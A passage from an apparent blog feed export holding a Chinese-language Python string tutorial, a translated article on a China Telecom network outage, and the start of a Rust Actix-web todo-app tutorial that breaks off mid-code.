      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>05. 字符串 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-122/"/>
    <id>https://qiwihui.com/qiwihui-blog-122/</id>
    <published>2022-08-13T01:54:25.630Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>字符串是字符序列。 Python中的字符串用双引号或单引号引起来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br></pre></td></tr></table></figure><p>Python字符串是不可变的，这意味着它们在创建后就无法更改。</p><span id="more"></span><h3><span id="chuang-jian">创建</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用单引号后者双引号</span></span><br><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">my_string = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">my_string = <span class="string">&quot;I&#x27; m  a &#x27;Geek&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转义反斜杠</span></span><br><span class="line">my_string = <span class="string">&#x27;I\&#x27; m  a &quot;Geek&quot;&#x27;</span></span><br><span class="line">my_string = <span class="string">&#x27;I\&#x27; m a \&#x27;Geek\&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多行字符串使用三个引号</span></span><br><span class="line">my_string = <span class="string">&quot;&quot;&quot;Hello</span></span><br><span class="line"><span class="string">World&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果需要字符串在下一行继续，使用反斜杠</span></span><br><span class="line">my_string = <span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">I<span class="string">&#x27; m a &#x27;</span>Geek<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Hello</span></span><br><span class="line"><span class="string">World</span></span><br><span class="line"><span class="string">Hello World</span></span><br></pre></td></tr></table></figure><h3><span id="fang-wen-zi-fu-he-zi-zi-fu-chuan">访问字符和子字符串</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引获取字符</span></span><br><span class="line">b = my_string[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过切片获取子字符串</span></span><br><span class="line">b = my_string[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># 注意，最后一个索引不包括</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[:<span class="number">5</span>] <span class="comment"># 从第一个元素开始</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[<span class="number">6</span>:] <span class="comment"># 直到最后</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[::<span class="number">2</span>] <span class="comment"># 从头到为每隔两个元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = my_string[::-<span class="number">1</span>] <span class="comment"># 使用负步长翻转列表</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">H</span><br><span class="line">el</span><br><span class="line">Hello</span><br><span class="line">World</span><br><span class="line">HloWrd</span><br><span class="line">dlroW olleH</span><br></pre></td></tr></table></figure><h3><span id="lian-jie-liang-ge-huo-duo-ge-zi-fu-chuan">连接两个或多个字符串</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 + 拼接字符串</span></span><br><span class="line">greeting = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line">sentence = greeting + <span class="string">&#x27; &#x27;</span> + name</span><br><span class="line"><span class="built_in">print</span>(sentence)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Tom</span><br></pre></td></tr></table></figure><h3><span id="die-dai"><strong>迭代</strong></span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用for循环迭代列表</span></span><br><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_string:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">H</span><br><span class="line">e</span><br><span class="line">l</span><br><span class="line">l</span><br><span class="line">o</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-zi-fu-huo-zi-zi-fu-chuan-shi-fou-cun-zai">检查字符或子字符串是否存在</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;e&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Hello&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;llo&quot;</span> <span class="keyword">in</span> <span class="string">&quot;Hello&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">有用的方法</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&quot;     Hello World &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除空格</span></span><br><span class="line">my_string = my_string.strip()</span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符的个数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大小写</span></span><br><span class="line"><span class="built_in">print</span>(my_string.upper())</span><br><span class="line"><span class="built_in">print</span>(my_string.lower())</span><br><span class="line"></span><br><span class="line"><span class="comment"># startswith 和 endswith</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>.startswith(<span class="string">&quot;he&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>.endswith(<span class="string">&quot;llo&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到子字符串的第一个索引，没有则返回 -1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>.find(<span class="string">&quot;o&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算字符或者子字符串的个数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>.count(<span class="string">&quot;e&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用其他字符串代替子字符串（当且仅当子字符串存在时）</span></span><br><span class="line"><span class="comment"># 注意：原字符串保持不变</span></span><br><span class="line">message = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">new_message = message.replace(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;Universe&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串切分为为列表</span></span><br><span class="line">my_string = <span class="string">&quot;how are you doing&quot;</span></span><br><span class="line">a = my_string.split() <span class="comment"># default argument is &quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">my_string = <span class="string">&quot;one,two,three&quot;</span></span><br><span class="line">a = my_string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将列表拼接为字符串</span></span><br><span class="line">my_list = [<span class="string">&#x27;How&#x27;</span>, <span class="string">&#x27;are&#x27;</span>, <span class="string">&#x27;you&#x27;</span>, <span class="string">&#x27;doing&#x27;</span>]</span><br><span class="line">a = <span class="string">&#x27; &#x27;</span>.join(my_list) <span class="comment"># 给出的字符串是分隔符，比如在每个元素之间添加 &#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello World</span><br><span class="line"><span class="number">11</span></span><br><span class="line">HELLO WORLD</span><br><span class="line">hello world</span><br><span class="line">[<span class="string">&#x27;how&#x27;</span>, <span class="string">&#x27;are&#x27;</span>, <span class="string">&#x27;you&#x27;</span>, <span class="string">&#x27;doing&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>]</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">Hello Universe</span><br><span class="line">How are you doing</span><br></pre></td></tr></table></figure><h3><span id="ge-shi-hua">格式化</span></h3><p>新样式使用 <code>format()</code> 方法，旧样式使用 <code>%</code> 操作符。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用大括号做占位符</span></span><br><span class="line">a = <span class="string">&quot;Hello &#123;0&#125; and &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认顺序时位置可以不写</span></span><br><span class="line">a = <span class="string">&quot;Hello &#123;&#125; and &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;The integer value is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些数字的特殊格式化规则</span></span><br><span class="line">a = <span class="string">&quot;The float value is &#123;0:.3f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2.1234</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;The float value is &#123;0:e&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2.1234</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;The binary value is &#123;0:b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># old style formatting by using % operator</span></span><br><span class="line"><span class="comment"># 旧的方式使用 % 操作符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello %s and %s&quot;</span> % (<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Tom&quot;</span>)) <span class="comment"># 多个参数时必需是元组</span></span><br><span class="line">val =  <span class="number">3.14159265359</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The decimal value is %d&quot;</span> % val)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The float value is %f&quot;</span> % val)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The float value is %.2f&quot;</span> % val)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">The integer value <span class="keyword">is</span> <span class="number">2</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">2.123</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">2.123400e+00</span></span><br><span class="line">The binary value <span class="keyword">is</span> <span class="number">10</span></span><br><span class="line">Hello Bob <span class="keyword">and</span> Tom</span><br><span class="line">The decimal value <span class="keyword">is</span> <span class="number">10</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">10.123450</span></span><br><span class="line">The <span class="built_in">float</span> value <span class="keyword">is</span> <span class="number">10.12</span></span><br></pre></td></tr></table></figure><h3><span id="f-strings">f-Strings</span></h3><p>从 Python 3.6 起，可以直接在花括号内使用变量。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line">a = <span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>. You are <span class="subst">&#123;age&#125;</span>.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">pi = <span class="number">3.14159</span></span><br><span class="line">a = <span class="string">f&quot;Pi is <span class="subst">&#123;pi:<span class="number">.3</span>f&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># f-Strings 在运行时计算，可以允许表达式</span></span><br><span class="line">a = <span class="string">f&quot;The value is <span class="subst">&#123;<span class="number">2</span>*<span class="number">60</span>&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello, Eric. You are <span class="number">25.</span></span><br><span class="line">Pi <span class="keyword">is</span> <span class="number">3.142</span></span><br><span class="line">The value <span class="keyword">is</span> <span class="number">120</span></span><br></pre></td></tr></table></figure><h3><span id="geng-duo-guan-yu-bu-bian-xing-he-pin-jie">更多关于不变性和拼接</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 因为字符串不可变，所以使用 + 或者 += 拼接字符串总是生成新的字符串</span></span><br><span class="line"><span class="comment"># 因此，多个操作时更加耗时。使用 join 方法更快。</span></span><br><span class="line"><span class="keyword">from</span> timeit <span class="keyword">import</span> default_timer <span class="keyword">as</span> timer</span><br><span class="line">my_list = [<span class="string">&quot;a&quot;</span>] * <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bad</span></span><br><span class="line">start = timer()</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_list:</span><br><span class="line">    a += i</span><br><span class="line">end = timer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;concatenate string with + : %.5f&quot;</span> % (end - start))</span><br><span class="line"></span><br><span class="line"><span class="comment"># good</span></span><br><span class="line">start = timer()</span><br><span class="line">a = <span class="string">&quot;&quot;</span>.join(my_list)</span><br><span class="line">end = timer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;concatenate string with join(): %.5f&quot;</span> % (end - start))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">concat string <span class="keyword">with</span> + : <span class="number">0.34527</span></span><br><span class="line">concat string <span class="keyword">with</span> join(): <span class="number">0.01191</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], 默认步长为 1</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># 注意，最后一个索引不包括</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># 直到最后</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># 从第一个元素开始</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">0</span>] <span class="comment"># 替换子部分，需要可迭代</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># 从头到为每隔两个元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a = a[::-<span class="number">1</span>] <span class="comment"># 使用负步长翻转列表</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[:] <span class="comment"># 使用切片复制元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      05. 字符串 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络故障透露中国互联网接入现状</title>
    <link href="https://qiwihui.com/qiwihui-blog-71/"/>
    <id>https://qiwihui.com/qiwihui-blog-71/</id>
    <published>2022-08-13T01:54:25.630Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://blog.thousandeyes.com/internet-outage-reveals-reach-of-chinas-connectivity/">Internet Outage Reveals Reach of China’s Connectivity</a></p><p>太平洋标准时间5月13日中午12点30分（北京时间5月14日凌晨3:30），中国电信经历了持续近5个小时的重大故障，后续效应持续了几个小时。正如在美国对贸易政策的紧张局势加剧之时所做的那样，可能很容易让人联想到对潜在地缘政治动机的猜测。然而，这种猜测忽略了许多人都不知道的关于中国和互联网的一些重要的基本现实。这次中断是深入了解中国互联网连接状况的绝佳机会。</p><span id="more"></span><iframe width="560" height="315" src="https://www.youtube.com/embed/cBylzjskZho" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2><span id="wo-men-suo-jian-de">我们所见的</span></h2><p>昨天，从下午早些时候开始，我们的全球优势点开始检测到中国电信骨干网上进出中国的互联网流量出现大量数据包丢失。数据包丢失持续数小时，主要影响中国大陆的网络基础设施，但也影响中国电信在新加坡的网络和美国的多个接入点，包括洛杉矶。</p><p>在长时间中断的过程中，通过受影响的基础设施的任何流量都被丢弃，这意味着中国境内外的一些互联网用户将遇到连接到各种网站和应用程序的服务中断。中国境内的用户试图访问中国以外的网站会受到影响，同时中国以外的用户尝试连接到中国境内的网站也是如此。</p><p>这些不仅仅影响西方网站和服务，许多美国主要网站，如Apple，Amazon，Microsoft，Slack，Workday，SAP等在中断期间都受到了影响。下图显示了中断的附带损害的部分范围。</p><p><img src="https://user-images.githubusercontent.com/3297411/57969235-a5393580-79a7-11e9-873f-62a2c42aa573.png" alt="Figure-1-China-Telecom-outage"></p><p>图1：受中国电信中断影响的基于云的服务。</p><p>在最高峰时，我们检测到因中国电信全球骨干网络状况而中断的100多项服务。我们还检测到中断对地理影响的变化，如下面的两个热图所示，在中断期间的不同点捕获。</p><p><img src="https://user-images.githubusercontent.com/3297411/57969242-af5b3400-79a7-11e9-95ee-10ea7a8158f8.png" alt="Figure-2-Geographic-scope-China-Telecom-outage"></p><p>图2：中国电信中断的地理范围在中断期间有所不同。</p><p>最严重的中断期是在太平洋标准时间12:30开始后的前三个小时内发生的，但许多服务在数小时后继续受到影响。一项特定服务的中断的扩展性质可以在下面的图3中看到。Amazon Web Services的数据包丢失从太平洋标准时间12:30开始飙升，持续约5个小时。下面的路径可视化显示了在17:30-17:45（太平洋标准时间）之间的网络状况，此时前往AWS的流量继续被中国电信路由器丢弃。</p><p><img src="https://user-images.githubusercontent.com/3297411/57969353-bb93c100-79a8-11e9-9636-e0afabbcb50f.png" alt="Figure-3-AWS-services-impacted"></p><p>图3：中国电信用户在12:30-17:45（太平洋标准时间）之间受影响的AWS服务。</p><p>受中断影响的另一家美国服务是Cloudflare的托管DNS服务。例如，WeWork的域名由Cloudflare托管，在下面的路径可视化中，您可以看到尝试访问Cloudflare的DNS服务器的流量（由最右边的绿色节点表示，IP地址为173.245.58.135，这是地理位置位于美国的路由前缀173.245.58.0/24的一部分。）被中国境内的中国电信路由器丢弃。结果是来自中国境内的许多用户无法访问WeWork网站。</p><p><img src="https://user-images.githubusercontent.com/3297411/57969270-efbab200-79a7-11e9-9013-05196425426d.png" alt="Figure-4-Cloudflare-DNS-resolution"></p><p>图4：Cloudflare的托管DNS服务受到影响，阻止了WeWork域的DNS解析。</p><h2><span id="zhong-guo-shi-shen-du-hu-lian-de">中国是深度互联的</span></h2><p>中断现已解决，但在ThousandEyes，我们相信每次互联网停运都是一次学习机会，这也不例外。这里有两个要点可能一般不太清楚。</p><p>首先，大多数人认为“<a href="https://blog.thousandeyes.com/deconstructing-great-firewall-china/">长城防火墙</a>”是一套统一管理的规则，使中国用户与全球其他地方隔离。他们想象一方面是中国庞大的用户和为他们提供服务的网络基础设施，另一方面，互联网的其余部分。但现实情况是，中国与外部网站和服务的联系非常紧密──至少是那些服务于商业利益的网站和服务。</p><p>中国互联网服务提供商（ISP）的标准操作程序允许访问大多数西方基于云的业务服务。通过允许国内和外国公司更有效地开展业务，从中国境内进入这些类型的网站符合中国的利益。通俗地说，您可以从中国境内访问许多美国服务。</p><p>其次，大多数人也可能没有意识到中国的互联网服务提供商将拥有全球性的存在。但是，如上图2所示，中国电信控制和管理的基础设施范围远远超出了中国的地理边界。该提供商还维护全球互联，与全球许多地方的服务提供商保持联系。</p><p>那些回忆起<a href="https://blog.thousandeyes.com/internet-vulnerability-takes-down-google/">去年影响谷歌服务的BGP路由泄漏</a>的读者，可能还记得中国电信在那一集中的客串。中国电信与负责尼日利亚工厂路线泄漏的ISP（MainOne）保持联系。中国电信未能过滤通往谷歌的广告路线（而是将其传播给其他同行），导致一些用户试图访问谷歌的服务中断。</p><h2><span id="hu-lian-wang-wu-chu-bu-zai">互联网无处不在</span></h2><p>无论互联网在哪里，无论是在一个自由的民主国家，还是在高度国家控制的环境中，它都是根本无法预测的。这是由于它被构建为自愿互连但单独管理的网络，基础技术的自动化性质（例如BGP路由）以及完全缺乏集中式运营管理的的集合。</p><p>当互联网的某个部分出现糟糕的事情时，尤其是在像中国这样的后续国家，互联网的其他部分会产生连锁反应。在这种情况下，超过一百种商业服务受到影响，毫无疑问，因此产生了生产力和收入损失。</p><p>当你考虑互联网是多么不可预测的时候，今天的企业依赖互联网的程度相当惊人。这是最终的不受控制的环境。这就引出了一个问题，如果你无法直接控制它，你是否拥有尽可能最好地管理它的可见性？</p><h2><span id="xian-zai-guan-yu-na-ge-cai-ce">现在关于那个猜测</span></h2><p>因为ThousandEyes本质上是（不断变化的）互联网的实时地图，我们能够跟踪互联网中断及其全球影响，无论是在中国，<a href="https://blog.thousandeyes.com/yandex-packet-loss-ddos-or-russian-firewall/">俄罗斯</a>还是其他地方，但我们不能也不会推测这种网络事件的地缘政治和可能的动机（如果有的话）。</p><p>然而，值得注意的是，中国的互联网服务提供商非常精通对进出网络的流量实施细粒度控制。如果有意展示禁用美国应用程序和服务的能力，那么从技术角度来看，它肯定没有得到很明确的体现。毕竟，被破坏的网站和服务是不分青红皂白的，影响到中国境内外的人。</p><h2><span id="li-ji-huo-de-ke-jian-xing">立即获得可见性</span></h2><p>主要的互联网中断是企业团队关注企业所依赖的大量外部依赖关系的警钟。如果你无法深入了解四面墙以外的应用和网络层条件，那么当你的云和互联网生态系统发生不可预测的事情时，您将陷入困境。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      网络故障透露中国互联网接入现状
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="GFW" scheme="https://qiwihui.com/tags/GFW/"/>
    
  </entry>
  
  <entry>
    <title>用 Rust Actix-web 写一个 Todo 应用（二）── 请求获取和日志记录</title>
    <link href="https://qiwihui.com/qiwihui-blog-106/"/>
    <id>https://qiwihui.com/qiwihui-blog-106/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="ru-he-huo-qu-lu-jing-can-shu">如何获取路径参数</span></h2><p>添加根据 id 获取数据操作：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::&#123;Error, ErrorKind&#125;;</span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todo</span>(client: &amp;Client, list_id: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;TodoList, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from todo_list where id = $1&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">may_todo</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query_opt</span>(&amp;statement, &amp;[&amp;list_id])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| TodoList::<span class="title function_ invoke__">from_row_ref</span>(&amp;row).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> may_todo &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(todo) =&gt; <span class="title function_ invoke__">Ok</span>(todo),</span><br><span class="line">        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::NotFound, <span class="string">&quot;Not found&quot;</span>)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置请求参数，设置使用 <code>Info</code> 作为请求路径参数序列化结构体：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::&#123;get_todo, get_todos&#125;;</span><br><span class="line"><span class="keyword">use</span> serde::Deserialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todo</span>(info: web::Path&lt;Info&gt;, db_pool: web::Data&lt;Pool&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = db_pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">get_todo</span>(&amp;client, info.list_id).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todo) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todo),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加路由：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> handlers::&#123;todo, todos&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...省略</span></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span class="title function_ invoke__">clone</span>())</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(todos))</span><br><span class="line">            .<span class="title function_ invoke__">route</span>(<span 